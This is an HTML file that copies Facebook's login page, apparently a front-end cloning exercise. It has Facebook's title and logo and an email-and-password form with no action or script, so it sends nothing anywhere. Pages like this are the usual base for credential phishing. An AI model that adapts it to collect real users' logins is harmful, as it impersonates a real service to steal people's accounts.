<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="left">
            <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook Logo">
            <h2>Connect with friends and the world around you on Facebook.</h2>
        </div>
        <div class="right">
            <form class="login-form">
                <input type="text" id="email" placeholder="Email address or phone number" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit">Log In</button>
                <a href="/recover/initiate" class="forgotten-account">Forgotten account?</a>
                <hr>
                <button type="button" class="signup">Create New Account</button>
            </form>
        </div>
    </div>
</body>
</html>
